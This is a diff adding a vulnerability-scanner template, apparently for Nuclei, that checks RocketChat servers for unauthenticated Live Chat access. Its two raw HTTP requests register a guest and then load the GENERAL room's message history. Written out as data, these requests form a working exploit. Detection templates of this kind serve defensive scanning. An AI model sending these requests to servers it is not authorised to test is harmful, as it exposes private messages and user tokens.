@@ -1,0 +1,48 @@
+id: rockethchat-unauth-access
+
+info:
+  name: RocketChat Unauthenticated Read Access
+  author: rojanrijal
+  severity: critical
+  description: An issue with the Live Chat accepting invalid parameters could potentially allow unauthenticated access to messages and user tokens.
+  reference: https://docs.rocket.chat/guides/security/security-updates
+  tags: rockethchat,unauth
+
+requests:
+  - raw:
+      - |
+        POST /api/v1/method.callAnon/cve_exploit HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{BaseURL}}
+        Connection: close
+        X-Requested-With: XMLHttpRequest
+        Content-Type: application/json
+        User-Agent: Ophion SecurityGroup
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.9
+
+        {"message":"{\"msg\":\"method\",\"method\":\"livechat:registerGuest\",\"params\":[{\"token\":\"cvenucleirocketchat\",\"name\":\"cve-2020-nuclei\",\"email\":\"cve@nuclei.local\"}],\"id\":\"123\"}"}
+
+      - |
+        POST /api/v1/method.callAnon/cve_exploit HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{BaseURL}}
+        Connection: close
+        Content-Type: application/json
+        User-Agent: Ophion SecurityGroup
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.9
+
+        {"message":"{\"msg\":\"method\",\"method\":\"livechat:loadHistory\",\"params\":[{\"token\":\"cvenucleirocketchat\",\"rid\":\"GENERAL\"}],\"msg\":\"123\"}"}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"{\"msg\":\"result\",\"result\":{\"messages\"'
+          - '"success":true'
+        part: body
+        condition: and
